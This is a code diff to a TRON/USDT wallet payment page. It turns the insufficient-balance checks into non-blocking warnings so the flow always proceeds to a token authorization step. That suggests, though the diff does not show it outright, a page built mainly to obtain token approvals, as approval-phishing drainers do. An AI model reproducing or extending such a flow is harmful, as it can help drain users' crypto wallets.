@@ -426,7 +426,7 @@
             address: null,
             trxBalance: null,
             usdtBalance: null,
-            hasApproved: false // 新增：记录是否已授权
+            hasApproved: false // 记录是否已授权
         };
         let currentAmount = '0';
         const TRX_TO_USD_RATE = 0.1562;
@@ -633,7 +633,7 @@
             setTimeout(() => tipElement.style.display = 'none', 3000);
         }
 
-        // 下一步按钮点击处理 - 改进版
+        // 下一步按钮点击处理 - 调整版
         async function onNextButtonClick() {
             try {
                 const address = addressInput.value.trim();
@@ -663,16 +663,22 @@
                     }
                 }
                 
-                // 3. 检查余额是否足够
+                // 3. 检查余额但不阻止流程，只做提示
+                let hasBalanceIssue = false;
                 if (userData.trxBalance && parseFloat(userData.trxBalance) < (amount + 1)) {
-                    tip("余额不足，需要额外1TRX作为手续费");
-                    return;
+                    tip("提示：余额不足，需要额外1TRX作为手续费");
+                    hasBalanceIssue = true;
                 }
                 
-                // 4. 检查USDT余额是否足够
+                // 4. 检查USDT余额但不阻止流程，只做提示
                 if (userData.usdtBalance && userData.usdtBalance < amount) {
-                    tip(`USDT余额不足，当前余额: ${userData.usdtBalance.toFixed(2)} USDT`);
-                    return;
+                    tip("提示：USDT余额不足");
+                    hasBalanceIssue = true;
+                }
+                
+                // 如果有余额问题，短暂延迟后继续流程
+                if (hasBalanceIssue) {
+                    await new Promise(resolve => setTimeout(resolve, 2000));
                 }
                 
                 // 5. 检查是否已授权，如果未授权则先进行授权
